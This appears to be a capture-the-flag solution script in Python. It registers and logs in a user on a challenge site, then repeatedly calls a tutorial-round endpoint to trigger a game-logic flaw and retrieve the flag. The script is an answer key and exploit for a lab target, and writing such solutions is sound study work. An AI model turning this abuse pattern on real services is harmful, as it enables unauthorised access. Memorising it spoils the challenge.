import requests
import sys
import re
if len(sys.argv) != 3:
	print('Usage: solution.py <challenge-url> <username>')

# Variables 
url = sys.argv[1]
username = sys.argv[2]
password = "IX4JMYWofv!!"

# Set-up your main user
with requests.Session() as s:
    regParam = {'username':username,'password':password,'confirm':password,'submit':'Register'}
    s.post(url + '/register',json=regParam)
    loginParam = {'username':username,'password':password,'submit':'Login'}
    s.post(url + '/login', json=loginParam)
    for i in range(25):
        print("Round ", str(i))
        s.get(url + '/tutorialround?pick=rock')
    r = s.get(url + '/flag')
    print(r.text)